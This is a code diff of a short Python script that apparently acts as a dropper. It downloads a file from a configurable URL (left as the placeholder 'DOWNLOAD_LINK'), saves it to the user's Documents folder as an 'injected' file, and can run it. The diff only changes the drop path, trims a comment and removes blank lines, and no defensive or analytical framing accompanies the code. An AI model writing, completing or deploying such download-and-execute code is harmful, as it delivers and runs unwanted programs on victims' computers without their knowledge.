@@ -7,7 +7,7 @@ import os
 #settings:
 #download url
 downloadUrl = "DOWNLOAD_LINK"
-#set this to True if you want the injected file to be ran. this only works with python files (.py)
+#set this to True if you want the injected file to be ran. this only works with python files
 runFile = False
 #ignore this stuff
 chunk_size = 8192
@@ -19,7 +19,7 @@ def main():
     user = os.path.expanduser('~')
     req = rq.get(downloadUrl, stream = True)
     filename = req.url[downloadUrl.rfind('/')+1:]
-    injectPath = PATH
+    injectPath = user + "\\Documents\\" + filename
 
     fileSize = int(req.headers['content-length'])
 
@@ -44,11 +44,5 @@ def main():
         print(out)
         print('ran injected script!')
 
-
-
-
-        
-
 if __name__ == '__main__':
     main()
-
